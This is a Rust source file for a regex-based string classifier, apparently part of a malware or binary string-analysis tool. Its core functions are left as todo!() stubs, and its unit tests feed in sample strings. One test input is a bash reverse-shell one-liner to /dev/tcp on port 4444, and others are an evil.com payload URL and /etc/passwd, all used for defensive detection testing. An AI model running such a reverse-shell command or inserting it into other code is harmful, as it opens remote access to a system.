//! Regex-based string classifier for URLs, IPs, emails, paths, and credentials.

use crate::classify::StringClassifier;
use crate::StringCategory;
use regex::Regex;
use std::sync::OnceLock;

struct PatternEntry {
    regex: Regex,
    category: StringCategory,
    confidence: f32,
}

fn patterns() -> &'static [PatternEntry] {
    todo!()
}

/// A classifier that uses compiled regexes to categorize strings.
pub struct RegexClassifier;

impl StringClassifier for RegexClassifier {
    fn name(&self) -> &str {
        "regex"
    }

    fn classify(&self, input: &str) -> Vec<(StringCategory, f32)> {
        todo!()
    }
}

inventory::submit!(&RegexClassifier as &'static dyn StringClassifier);

#[cfg(test)]
mod tests {
    use super::*;

    fn classify(input: &str) -> Vec<(StringCategory, f32)> {
        RegexClassifier.classify(input)
    }

    #[test]
    fn classifies_url() {
        let r = classify("https://evil.com/payload.exe");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::Url));
    }

    #[test]
    fn classifies_ipv4() {
        let r = classify("192.168.1.1");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::IpV4));
    }

    #[test]
    fn classifies_email() {
        let r = classify("user@example.com");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::Email));
    }

    #[test]
    fn classifies_unix_path() {
        let r = classify("/etc/passwd");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::UnixPath));
    }

    #[test]
    fn classifies_windows_path() {
        let r = classify("C:\\Windows\\System32\\cmd.exe");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::WindowsPath));
    }

    #[test]
    fn classifies_registry_key() {
        let r = classify("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::RegistryKey));
    }

    #[test]
    fn classifies_ethereum_address() {
        let r = classify("0x742d35Cc6634C0532925a3b844Bc9e7595f2bD28");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::CryptoAddress));
    }

    #[test]
    fn classifies_pem_private_key() {
        let r = classify("-----BEGIN RSA PRIVATE KEY-----");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::PrivateKey));
    }

    #[test]
    fn classifies_shell_command() {
        let r = classify("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(r.iter().any(|(c, _)| *c == StringCategory::ShellCommand));
    }

    #[test]
    fn no_match_for_garbage() {
        let r = classify("xyzq");
        assert!(r.is_empty());
    }
}
